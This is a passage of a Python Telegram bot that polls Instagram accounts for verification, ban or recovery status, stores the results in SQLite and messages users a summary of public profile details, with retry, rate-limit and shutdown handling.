                
                retry_count = 0
                
                if state == "VERIFIED":
                    elapsed = int(time.time()) - monitor_start_time
                    await send_completion_message(user_id, context, "verified", info, elapsed, ig_username)
                    db.cursor.execute("UPDATE monitors SET status='completed', result_data=? WHERE id=?", 
                                    (json.dumps({"verified": True, "time": elapsed}), monitor_id))
                    db.conn.commit()
                    logger.info(f"Verification detected for @{ig_username} after {elapsed}s")
                    break
                elif state == "ACCOUNT_NOT_FOUND":
                    logger.warning(f"Account @{ig_username} not found during verification monitor")
                    db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                    db.conn.commit()
                    break
            
            await asyncio.sleep(monitor_interval)
        except RateLimitError:
            logger.warning(f"Rate limit hit for monitor {monitor_id}, waiting longer")
            await asyncio.sleep(monitor_interval * 2)
        except PleaseWaitFewMinutes:
            logger.warning(f"Please wait error for monitor {monitor_id}, waiting 60s")
            await asyncio.sleep(60)
        except asyncio.CancelledError:
            logger.info(f"Monitor {monitor_id} cancelled")
            break
        except Exception as e:
            logger.error(f"Monitor {monitor_id} error: {e}")
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                logger.error(f"Monitor {monitor_id} failed after {MAX_RETRIES} retries")
                db.cursor.execute("UPDATE monitors SET status='failed' WHERE id=?", (monitor_id,))
                db.conn.commit()
                break
            await asyncio.sleep(RETRY_BACKOFF * retry_count)
    
    cleanup_monitor_task(monitor_id)

async def send_completion_message(user_id: int, context: ContextTypes.DEFAULT_TYPE, status: str, info, elapsed: int, ig_username: str, ban_info: Dict = None):
    time_str = format_time(elapsed)
    
    if status == "verified":
        emoji = "✅"
        status_text = "Verified!"
        msg = f"{emoji} <b>Monitoring Completed — Account {status_text}</b>\n{SEPARATOR}\n"
    elif status == "banned":
        emoji = "🚫"
        status_text = "Banned!"
        msg = f"{emoji} <b>Monitoring Completed — Account {status_text}</b>\n{SEPARATOR}\n"
    elif status == "unbanned":
        emoji = "♻️"
        status_text = "Recovered"
        msg = f"{emoji} <b>Monitoring Completed</b>\n\n🎉 <b>Account {status_text}</b>\n{SEPARATOR}\n"
    else:
        return
    
    safe_username = safe_html_escape(ig_username)
    msg += f"👤 Username: @{safe_username}\n"
    msg += f"⏱️ Time Taken: {time_str}\n"
    
    if status == "unbanned":
        msg += f"\nThe account is now available on Instagram.\n"
        msg += f"{SEPARATOR}\n\n👤 <b>Account Information</b>\n"
    
    if status == "banned" and ban_info:
        safe_name = safe_html_escape(ban_info.get('full_name', 'N/A'))
        safe_bio = safe_html_escape(ban_info.get('biography', 'N/A'))
        msg += f"📛 Name: {safe_name}\n"
        msg += f"👥 Followers: {ban_info.get('follower_count', 0)}\n"
        msg += f"📌 Following: {ban_info.get('following_count', 0)}\n"
        msg += f"📷 Posts: {ban_info.get('media_count', 0)}\n"
        msg += f"🔒 Private: {'Yes' if ban_info.get('is_private', False) else 'No'}\n"
        msg += f"✅ Verified: {'Yes' if ban_info.get('is_verified', False) else 'No'}\n"
        msg += f"📝 Bio: {safe_bio}\n"
    elif info:
        safe_name = safe_html_escape(info.full_name or "N/A")
        safe_bio = safe_html_escape(info.biography or "N/A")
        msg += f"📛 Name: {safe_name}\n"
        msg += f"👥 Followers: {info.follower_count}\n"
        msg += f"📌 Following: {info.following_count}\n"
        msg += f"📷 Posts: {info.media_count}\n"
        msg += f"🔒 Private: {'Yes' if info.is_private else 'No'}\n"
        msg += f"✅ Verified: {'Yes' if info.is_verified else 'No'}\n"
        msg += f"📝 Bio: {safe_bio}\n"
    
    msg += f"{SEPARATOR}\n— @rejerks | WLZBI"
    
    try:
        await context.bot.send_message(user_id, msg, parse_mode="HTML")
        logger.info(f"Completion message sent for monitor status: {status}")
    except Exception as e:
        logger.error(f"Failed to send completion message: {e}")

async def shutdown():
    logger.info("Shutting down...")
    shutdown_event.set()
    
    for task_set in active_tasks.values():
        for task in task_set:
            if not task.done():
                task.cancel()
    
    for task in monitor_tasks.values():
        if not task.done():
            task.cancel()
    
    await asyncio.sleep(3)
    db.close()
    logger.info("Shutdown complete")

def handle_shutdown(signum, frame):
    logger.info(f"Received signal {signum}")
    asyncio.create_task(shutdown())

def main():
    global application
    
    signal.signal(signal.SIGINT, handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    
    rebalance_monitor_workers()
    
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .connect_timeout(CONNECT_TIMEOUT)
        .read_timeout(REQUEST_TIMEOUT)
        .write_timeout(REQUEST_TIMEOUT)
        .pool_timeout(REQUEST_TIMEOUT)
        .build()
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CallbackQueryHandler(menu_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    application.add_error_handler(error_handler)
    
    logger.info("Bot started successfully!")
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        timeout=REQUEST_TIMEOUT
    )

if __name__ == "__main__":
    try:
        Thread(target=run_flask, daemon=True).start()
        main()
    except KeyboardInterrupt:
        asyncio.run(shutdown())
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        asyncio.run(shutdown())
